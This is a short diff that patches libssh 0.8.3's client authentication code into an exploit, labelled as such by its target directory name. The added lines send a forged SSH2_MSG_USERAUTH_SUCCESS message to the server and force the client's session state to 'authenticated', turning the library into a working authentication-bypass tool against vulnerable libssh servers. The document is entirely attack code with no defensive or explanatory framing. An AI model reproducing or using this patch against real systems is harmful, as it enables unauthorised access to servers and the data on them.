--- libssh-0.8.3/src/auth.c	2018-10-19 00:51:48.146043096 +0000
+++ exploit-libssh-0.8.3/src/auth.c	2018-10-19 00:53:50.846178897 +0000
@@ -139,6 +139,16 @@
 
     rc = ssh_handle_packets_termination(session, SSH_TIMEOUT_USER,
         ssh_auth_response_termination, session);
+    /* we tried to authenticate, so send an authentication success packet to break state machine */
+    ssh_buffer_pack(session->out_buffer, "bsss",SSH2_MSG_USERAUTH_SUCCESS,session->opts.username,"ssh-connection","none");
+    ssh_packet_send(session);
+    /* set the client side session settings & clear errors */
+    session->auth.state = SSH_AUTH_STATE_SUCCESS;
+    session->session_state = SSH_SESSION_STATE_AUTHENTICATED;
+    session->flags |= SSH_SESSION_FLAG_AUTHENTICATED;
+    ssh_reset_error(session);
+    session->auth.current_method = SSH_AUTH_METHOD_UNKNOWN;
+    /* the library will force return SSH_AUTH_STATE_SUCCESS now */
     if (rc == SSH_ERROR) {
         return SSH_AUTH_ERROR;
     }
